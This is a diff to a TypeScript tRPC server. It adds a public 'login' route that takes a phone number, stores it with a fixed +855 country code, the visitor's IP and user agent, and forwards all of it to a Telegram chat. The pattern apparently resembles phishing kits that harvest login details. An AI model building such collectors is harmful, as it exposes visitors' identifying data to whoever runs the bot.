@@ -2,6 +2,9 @@ import { COOKIE_NAME } from "@shared/const";
 import { getSessionCookieOptions } from "./_core/cookies";
 import { systemRouter } from "./_core/systemRouter";
 import { publicProcedure, router } from "./_core/trpc";
+import { z } from "zod";
+import { savePhoneSubmission } from "./db";
+import { sendTelegramMessage, formatPhoneSubmissionMessage } from "./telegram";
 
 export const appRouter = router({
   system: systemRouter,
@@ -17,12 +20,44 @@ export const appRouter = router({
     }),
   }),
 
-  // TODO: add feature routers here, e.g.
-  // todo: router({
-  //   list: protectedProcedure.query(({ ctx }) =>
-  //     db.getUserTodos(ctx.user.id)
-  //   ),
-  // }),
+  login: router({
+    submitPhone: publicProcedure
+      .input(
+        z.object({
+          phoneNumber: z.string().min(1, "Phone number is required"),
+        })
+      )
+      .mutation(async ({ input, ctx }) => {
+        const { phoneNumber } = input;
+        
+        // Get client IP and user agent
+        const ipAddress = ctx.req.ip || ctx.req.headers['x-forwarded-for'] as string || 'unknown';
+        const userAgent = ctx.req.headers['user-agent'] || 'unknown';
+
+        try {
+          // Save to database
+          await savePhoneSubmission({
+            phoneNumber,
+            countryCode: "+855",
+            ipAddress,
+            userAgent,
+          });
+
+          // Send to Telegram
+          const message = formatPhoneSubmissionMessage(phoneNumber, ipAddress, userAgent);
+          await sendTelegramMessage(message);
+
+          return {
+            success: true,
+            message: "Phone number submitted successfully",
+          };
+        } catch (error) {
+          console.error("[Login] Error submitting phone:", error);
+          throw new Error("Failed to submit phone number");
+        }
+      }),
+  }),
 });
 
 export type AppRouter = typeof appRouter;
+
